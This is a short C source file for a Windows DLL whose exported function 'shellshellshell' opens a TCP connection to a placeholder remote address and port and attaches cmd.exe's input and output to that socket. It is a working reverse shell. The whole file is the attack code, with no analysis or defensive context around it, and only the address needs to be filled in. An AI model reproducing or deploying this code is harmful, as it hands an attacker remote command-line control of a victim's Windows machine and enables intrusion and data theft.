    // compile: cl /LD main.c
    #include <stdio.h>
    #include <winsock2.h>

    #pragma comment(lib,"ws2_32")

    typedef struct _Remote {
        char addr[16];
        unsigned short port;
    } Remote;

    Remote remote = {"aaa.bbb.ccc.ddd", 65535};

    BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) {
    switch ( ul_reason_for_call ) {
        case DLL_PROCESS_ATTACH:
        break;
        
        case DLL_THREAD_ATTACH:
        break;
        
        case DLL_THREAD_DETACH:
        break;
        
        case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
    }

    __declspec(dllexport) void shellshellshell() {
        WSADATA wsaData;
        SOCKET  sock;
        STARTUPINFO         startup_info;
        PROCESS_INFORMATION process_info;
        struct sockaddr_in  remote_addr;

        WSAStartup(MAKEWORD(2, 2), &wsaData);
        sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

        remote_addr.sin_family = AF_INET;
        remote_addr.sin_port   = htons(remote.port);
        remote_addr.sin_addr.s_addr = inet_addr(remote.addr);

        WSAConnect(sock, (SOCKADDR*)&remote_addr, sizeof(remote_addr), NULL, NULL, NULL, NULL);

        ZeroMemory(&startup_info, sizeof(startup_info));
        startup_info.cb = sizeof(startup_info);
        startup_info.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        startup_info.hStdInput = startup_info.hStdOutput = startup_info.hStdError = (HANDLE)sock;

        CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startup_info, &process_info);
    }